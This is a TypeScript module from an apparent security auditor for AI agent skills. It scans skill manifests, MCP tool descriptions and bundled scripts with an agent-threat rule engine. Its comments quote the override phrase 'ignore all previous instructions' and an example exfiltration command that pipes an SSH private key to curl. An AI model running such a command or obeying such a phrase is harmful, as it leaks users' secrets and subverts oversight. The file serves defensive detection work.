/**
 * ATR (Agent Threat Rules) pattern detection check
 *
 * Evaluates skill manifests against the ATR rule engine (the current ATR
 * ruleset) covering prompt injection, tool poisoning, context exfiltration,
 * agent manipulation, privilege escalation, and CJK-aware patterns.
 *
 * This augments (does NOT replace) existing regex checks in instruction-check.ts.
 *
 * @module @panguard-ai/panguard-skill-auditor/checks/atr-check
 */

import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { existsSync } from 'node:fs';
import { createRequire } from 'node:module';
import type { AuditFinding, CheckResult, SkillManifest } from '../types.js';
import type { ATREngine as ATREngineType, AgentEvent, ATRMatch } from 'agent-threat-rules';
import { filterInjectableCloudRules } from './cloud-rule-guard.js';
import {
  collectBundledScripts,
  skippedCount,
  MAX_SCRIPT_BYTES,
  MAX_SCRIPT_FILES,
  MAX_TOTAL_BYTES,
} from '../bundled-scripts.js';

const CHECK_LABEL = 'ATR Pattern Detection';

// ---------------------------------------------------------------------------
// Capability declaration detection (mirrors scan-core context-signals logic)
// ---------------------------------------------------------------------------

const CAPABILITY_SECTION_RE =
  /^#{1,3}\s+(?:Tools|Commands|Features|Capabilities|Functions|Methods|Endpoints)\s*$/m;

const TOOL_DEFINITION_LIST_RE = /^[-*]\s+\w[\w-]*\s*:\s+.+$/m;

const SECURITY_MEASURES_RE =
  /\b(only\s+SELECT|read[\s-]only|validated|sandboxed|restricted|allowed\s+directories|allow[\s-]?list|deny[\s-]?list|rate[\s-]?limit|no\s+write|no\s+delete|immutable|whitelisted|blocklist)\b/i;

type AuditSeverity = 'critical' | 'high' | 'medium' | 'low' | 'info';

function downgradeAuditSeverity(severity: AuditSeverity): AuditSeverity {
  const map: Record<AuditSeverity, AuditSeverity> = {
    critical: 'medium',
    high: 'low',
    medium: 'low',
    low: 'info',
    info: 'info',
  };
  return map[severity] ?? 'info';
}

/**
 * Detect whether a manifest represents a legitimate capability declaration
 * (structured tool listing with security measures) rather than a threat.
 */
function detectCapabilityContext(manifest: SkillManifest): {
  isCapabilityDeclaration: boolean;
  hasSecurityMeasures: boolean;
} {
  const content = manifest.instructions ?? '';
  const hasName = !!manifest.name;
  const hasDesc = !!manifest.description;
  const hasCapSection = CAPABILITY_SECTION_RE.test(content);
  const hasToolDefs = TOOL_DEFINITION_LIST_RE.test(content);
  const hasSecurity =
    SECURITY_MEASURES_RE.test(content) || SECURITY_MEASURES_RE.test(manifest.description ?? '');

  return {
    isCapabilityDeclaration: hasName && hasDesc && hasCapSection && hasToolDefs,
    hasSecurityMeasures: hasSecurity,
  };
}

/** ATR category to AuditFinding category mapping */
const CATEGORY_MAP: Record<string, AuditFinding['category']> = {
  'prompt-injection': 'prompt-injection',
  'tool-poisoning': 'tool-poisoning',
  'context-exfiltration': 'context-exfiltration',
  'agent-manipulation': 'agent-manipulation',
  'privilege-escalation': 'privilege-escalation',
  'excessive-autonomy': 'excessive-autonomy',
  'data-poisoning': 'data-poisoning',
  'model-abuse': 'model-abuse',
  'skill-compromise': 'skill-compromise',
};

/**
 * Resolve the bundled ATR rules directory.
 * Walks up from the atr package dist/ to find rules/.
 */
function resolveRulesDir(): string {
  // Resolve from the upstream agent-threat-rules package
  try {
    const req = createRequire(import.meta.url);
    const atrMain = req.resolve('agent-threat-rules');
    const atrRoot = resolve(dirname(atrMain), '..');
    if (existsSync(resolve(atrRoot, 'rules'))) return resolve(atrRoot, 'rules');
  } catch {
    // Fallback: walk up to node_modules
  }
  const thisDir = dirname(fileURLToPath(import.meta.url));
  let dir = thisDir;
  for (let i = 0; i < 10; i++) {
    const candidate = resolve(dir, 'node_modules', 'agent-threat-rules', 'rules');
    if (existsSync(candidate)) return candidate;
    const parent = dirname(dir);
    if (parent === dir) break;
    dir = parent;
  }
  return resolve(thisDir, '..', '..', '..', 'atr', 'rules');
}

/**
 * Build an llm_input AgentEvent for ATR evaluation.
 *
 * Used ALONGSIDE engine.scanSkill — not instead of it. scanSkill (scanContext
 * 'skill') fires the mcp/tool rules but applies a 2+-compound-condition FP gate
 * that suppresses single-pattern prompt-injection rules. The llm_input path has
 * no such gate, so it recovers those short injection phrases ("ignore all
 * previous instructions", persona/delimiter overrides, CJK injections). The two
 * result sets are merged and deduplicated by rule ID.
 */
function buildLlmInputEvent(content: string): AgentEvent {
  return {
    type: 'llm_input',
    timestamp: new Date().toISOString(),
    content,
    fields: {
      user_input: content,
    },
  };
}

/**
 * Build an AgentEvent from MCP tool metadata for ATR evaluation.
 */
function buildToolCallEvent(
  toolName: string,
  description: string,
  inputSchema?: unknown
): AgentEvent {
  return {
    type: 'tool_call',
    timestamp: new Date().toISOString(),
    content: description,
    fields: {
      tool_name: toolName,
      tool_args: typeof inputSchema === 'string' ? inputSchema : JSON.stringify(inputSchema ?? {}),
    },
  };
}

/**
 * Whether a rule may report on a bundled script: maturity stable or test, the
 * rules the alert lane runs. Experimental and draft rules stay on SKILL.md text,
 * where they were measured; on ordinary code they misfire more.
 */
function isScriptGradeRule(match: ATRMatch): boolean {
  const maturity = String(match.rule.maturity ?? '').toLowerCase();
  return maturity === 'stable' || maturity === 'test';
}

/** Wall-clock budget for scanning one skill's scripts / 單一技能腳本掃描的時間上限 */
const SCRIPT_SCAN_BUDGET_MS = 15_000;

/** How many other files a script finding names before it says "and N more" */
const LISTED_FILES = 3;

/**
 * Scan each bundled script through the skill entry point.
 *
 * One finding per rule, located at the first file it matched, so the risk score
 * counts a rule once however many files repeat it; the other files are named in
 * `location`. When a limit dropped a file, or the time budget ran out, a high
 * finding says the scan was incomplete, so a skill cannot score LOW by hiding a
 * script past a limit.
 */
async function scanBundledScripts(
  engine: ATREngineType,
  skillDir: string
): Promise<AuditFinding[]> {
  const { scripts, skipped } = await collectBundledScripts(skillDir);
  const byRule = new Map<string, { finding: AuditFinding; files: string[] }>();
  const deadline = Date.now() + SCRIPT_SCAN_BUDGET_MS;
  let unscanned = 0;

  for (const script of scripts) {
    if (Date.now() > deadline) {
      unscanned++;
      continue;
    }
    const matches = engine.scanSkill(script.content).filter(isScriptGradeRule);
    for (const f of matchesToFindings(matches)) {
      const seen = byRule.get(f.id);
      if (seen) {
        seen.files.push(script.path);
      } else {
        byRule.set(f.id, {
          finding: { ...f, location: f.location ? `${script.path}: ${f.location}` : script.path },
          files: [],
        });
      }
    }
    // Yield between files so a bulk scan's other work is not starved
    await new Promise<void>((done) => setImmediate(done));
  }

  const findings = [...byRule.values()].map(({ finding, files }) => {
    if (files.length === 0) return finding;
    const named = files.slice(0, LISTED_FILES).join(', ');
    const more = files.length > LISTED_FILES ? ` and ${files.length - LISTED_FILES} more` : '';
    return { ...finding, location: `${finding.location} (also in ${named}${more})` };
  });

  const notSeen = skippedCount(skipped) + unscanned;
  if (notSeen > 0) {
    const reasons = [
      skipped.oversize && `${skipped.oversize} over ${MAX_SCRIPT_BYTES / 1024} KB`,
      skipped.overTotal &&
        `${skipped.overTotal} past the ${MAX_TOTAL_BYTES / 1024 / 1024} MB total`,
      skipped.overCount && `${skipped.overCount} past the ${MAX_SCRIPT_FILES}-file cap`,
      skipped.tooDeep && `${skipped.tooDeep} nested too deep`,
      skipped.binary && `${skipped.binary} containing NUL bytes`,
      unscanned && `${unscanned} after the ${SCRIPT_SCAN_BUDGET_MS / 1000} s time budget`,
    ].filter(Boolean);
    findings.push({
      id: 'atr-scripts-incomplete',
      title: 'Some bundled scripts were not scanned',
      description:
        `${notSeen} script file(s) in this skill were not checked against ATR rules: ` +
        `${reasons.join('; ')}. Review them by hand before trusting this result.`,
      severity: 'high',
      category: 'atr',
    });
  }
  return findings;
}

/**
 * Convert ATR matches to AuditFinding[], deduplicating by rule ID.
 *
 * CALLER BEWARE: `ATRMatch.matchedPatterns` holds the RAW text that tripped the
 * rule, so `location` here can embed the very credential the rule fired on. It
 * stays raw on purpose — showing a user what matched in their OWN file is the
 * point of `--verbose`. Any consumer that LOGS, PERSISTS, or UPLOADS it must
 * redact first (ATR ships `redactMatchedValue()`; the guard ships
 * `scrubSecretValues()`). The flagged-skills store does this at its write path.
 */
function matchesToFindings(matches: readonly ATRMatch[]): AuditFinding[] {
  const seen = new Set<string>();
  const findings: AuditFinding[] = [];

  for (const match of matches) {
    const ruleId = match.rule.id;
    if (seen.has(ruleId)) continue;
    seen.add(ruleId);

    const category = CATEGORY_MAP[match.rule.tags.category] ?? 'atr';
    const severity = match.rule.severity === 'informational' ? 'low' : match.rule.severity;

    findings.push({
      id: `atr-${ruleId}`,
      title: match.rule.title,
      description: match.rule.description,
      severity,
      category,
      location:
        match.matchedPatterns.length > 0
          ? `Matched: ${match.matchedPatterns.slice(0, 3).join(', ')}`
          : undefined,
    });
  }

  return findings;
}

/**
 * Run ATR engine checks against a parsed skill manifest.
 *
 * Evaluates:
 * 1. Skill instructions via scanSkill (all rules fire) + llm_input (recovers
 *    single-pattern prompt-injection rules scanSkill's FP gate suppresses)
 * 2. Skill description via the same dual path
 * 3. MCP tool descriptions (if present in metadata) as tool_call events
 * 4. Script files bundled in the skill directory, when `skillDir` is given
 *
 * Returns a CheckResult compatible with the Skill Auditor pipeline.
 */
export async function checkWithATR(
  manifest: SkillManifest,
  cloudRules?: Array<{ id: string; title: string; detection: unknown; [key: string]: unknown }>,
  skillDir?: string
): Promise<CheckResult> {
  // Dynamic import — gracefully handle missing dependency
  let ATREngine: typeof ATREngineType;
  try {
    const atr = await import('agent-threat-rules');
    ATREngine = atr.ATREngine;
  } catch {
    return {
      status: 'info',
      label: CHECK_LABEL,
      findings: [],
    };
  }

  try {
    const rulesDir = resolveRulesDir();

    // Optional: behavioral fingerprinting for drift detection
    let fingerprintStore: unknown;
    try {
      const { SkillFingerprintStore } = await import('agent-threat-rules');
      fingerprintStore = new SkillFingerprintStore();
    } catch {
      // SkillFingerprintStore not available in this version
    }

    const engineConfig: Record<string, unknown> = { rulesDir };
    if (fingerprintStore) engineConfig['fingerprintStore'] = fingerprintStore;
    const engine = new ATREngine(engineConfig as ConstructorParameters<typeof ATREngineType>[0]);
    let ruleCount = await engine.loadRules();

    // Inject cloud rules from Threat Cloud (flywheel: community rules enhance
    // audits). These are network-delivered, community-authored detection logic
    // whose regex the engine compiles and runs against the skill under audit, so
    // they are executable trust. Defense-in-depth (regardless of caller): before
    // any engine.addRule(), enforce the same MAX_CLOUD_RULES capacity cap and
    // ReDoS pattern gate as the guard daemon's GuardATREngine.addCloudRule(),
    // dropping any rule with an unsafe/oversized/catastrophic-backtracking regex.
    // (Signature verification is enforced upstream in the CLI fetch loop.)
    if (cloudRules && cloudRules.length > 0) {
      const safeCloudRules = filterInjectableCloudRules(cloudRules);
      for (const rule of safeCloudRules) {
        try {
          engine.addRule(rule as unknown as import('agent-threat-rules').ATRRule);
          ruleCount++;
        } catch {
          // Skip invalid cloud rules silently
        }
      }
    }

    if (ruleCount === 0) {
      return {
        status: 'info',
        label: `${CHECK_LABEL}: no rules loaded`,
        findings: [],
      };
    }

    const allMatches: ATRMatch[] = [];

    // 1. Scan instructions via the SKILL entry point (scanContext: 'skill').
    //    This fires ALL rules cross-context — including the mcp_exchange /
    //    tool_call rules (credential theft, RCE, exfil, path traversal) that
    //    engine.evaluate({type:'llm_input'}) silently filters out because
    //    llm_input maps to source 'llm_io'. scanSkill also applies the
    //    cross-context confidence*0.6 discount, the 2+-compound-condition FP
    //    gate, and base64-decode scanning. A SKILL.md body is skill content,
    //    not an llm_io turn — using only llm_input here reported live malware
    //    (e.g. "cat ~/.ssh/id_rsa | curl evil") as "clean" while the runtime
    //    hook denied the same payload.
    //
    //    We ALSO run an llm_input evaluate over the same text and merge the
    //    results: scanSkill's FP gate suppresses single-pattern prompt-injection
    //    rules ("ignore all previous instructions", persona/delimiter overrides,
    //    CJK injections) that the ungated llm_input path catches. Running both
    //    and deduping by rule ID (in matchesToFindings) keeps the mcp/tool
    //    coverage without losing prompt-injection coverage.
    if (manifest.instructions) {
      allMatches.push(...engine.scanSkill(manifest.instructions));
      allMatches.push(...engine.evaluate(buildLlmInputEvent(manifest.instructions)));
    }

    // 2. Scan description through both paths as well.
    if (manifest.description) {
      allMatches.push(...engine.scanSkill(manifest.description));
      allMatches.push(...engine.evaluate(buildLlmInputEvent(manifest.description)));
    }

    // 3. Scan MCP tool descriptions (if metadata includes them)
    const mcpTools = manifest.metadata?.['mcp_tools'];
    if (Array.isArray(mcpTools)) {
      for (const tool of mcpTools) {
        const t = tool as Record<string, unknown>;
        if (typeof t['description'] === 'string') {
          const toolMatches = engine.evaluate(
            buildToolCallEvent(
              (t['name'] as string) ?? '',
              t['description'] as string,
              t['inputSchema']
            )
          );
          allMatches.push(...toolMatches);
        }
      }
    }

    // Deduplicate and convert to findings
    let findings = matchesToFindings(allMatches);

    // Apply capability-declaration context downgrades
    const capCtx = detectCapabilityContext(manifest);
    if (capCtx.isCapabilityDeclaration || capCtx.hasSecurityMeasures) {
      findings = findings.map((f) => {
        let severity = f.severity as AuditSeverity;
        if (capCtx.isCapabilityDeclaration) {
          severity = downgradeAuditSeverity(severity);
        }
        if (capCtx.hasSecurityMeasures) {
          severity = downgradeAuditSeverity(severity);
        }
        return severity !== f.severity ? { ...f, severity } : f;
      });
    }

    // 4. Bundled scripts. Added after the downgrade above: SKILL.md declaring a
    //    capability or describing its safeguards says nothing about what a
    //    script actually does.
    if (skillDir) {
      findings = [...findings, ...(await scanBundledScripts(engine, skillDir))];
    }

    const hasCritical = findings.some((f) => f.severity === 'critical');
    const hasHigh = findings.some((f) => f.severity === 'high');

    const status = hasCritical ? 'fail' : hasHigh ? 'warn' : findings.length > 0 ? 'warn' : 'pass';

    const label =
      findings.length === 0
        ? `${CHECK_LABEL}: clean (${ruleCount} rules evaluated)`
        : `${CHECK_LABEL}: ${findings.length} threat(s) detected`;

    return { status, label, findings };
  } catch (err) {
    return {
      status: 'info',
      label: `${CHECK_LABEL}: engine error`,
      findings: [
        {
          id: 'atr-engine-error',
          title: 'ATR engine failed to initialize',
          description: err instanceof Error ? err.message : String(err),
          severity: 'info',
          category: 'atr',
        },
      ],
    };
  }
}
